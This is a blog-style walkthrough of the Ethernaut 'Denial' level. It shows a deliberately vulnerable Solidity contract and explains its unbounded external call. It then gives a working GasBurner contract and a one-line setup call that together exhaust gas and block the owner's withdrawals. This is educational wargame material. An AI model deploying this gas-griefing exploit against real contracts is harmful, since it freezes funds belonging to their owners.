# Level 20: Denial

This is the level 20 of OpenZeppelin [Ethernaut](https://ethernaut.openzeppelin.com/) web3/solidity based game.

## Pre-requisites

- Solidity [`call` & `receive`](https://solidity-by-example.org/sending-ether/) methods
- [gasleft](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html#block-and-transaction-properties) function

## Hack

Given contract:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

`player` has to plant a denial of service attack such that `owner` is unable to withdraw funds through `withdraw` method.

This contract's vulnerability comes from the `withdraw` method which does not mitigate against possible attack through execution of some unknown external contract code through `call` method. `call` did not set a gas limit that external call can use.

The `call` method here can invoke the `receive` method of a malicious contract at `partner` address. And this is where we're going to eat up all gas so that `withdraw` function reverts with out of gas exception.

Since writing to storage is one of the most expensive operations, I will chose it for exhausting the gas in the malicious `GasBurner`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GasBurner {
    uint256 n;

    function burn() internal {
        while (gasleft() > 0) {
            n += 1;
        }
    }

    receive() external payable {
        burn();
    }
}
```

Deploy `GasBurner` on Remix and copy it's address.

Now, set the `partner` in `Denial`:
```javascript
await contract.setWithdrawPartner('<gas-burner-address>')
```

The `GasBurner` has been planted! `withdraw` would now revert on invocation.

Fin.


_Learned something awesome? Consider starring the [github repo](https://github.com/theNvN/ethernaut-openzeppelin-hacks)_ 😄

_and following me on twitter [here](https://twitter.com/heyNvN)_ 🙏
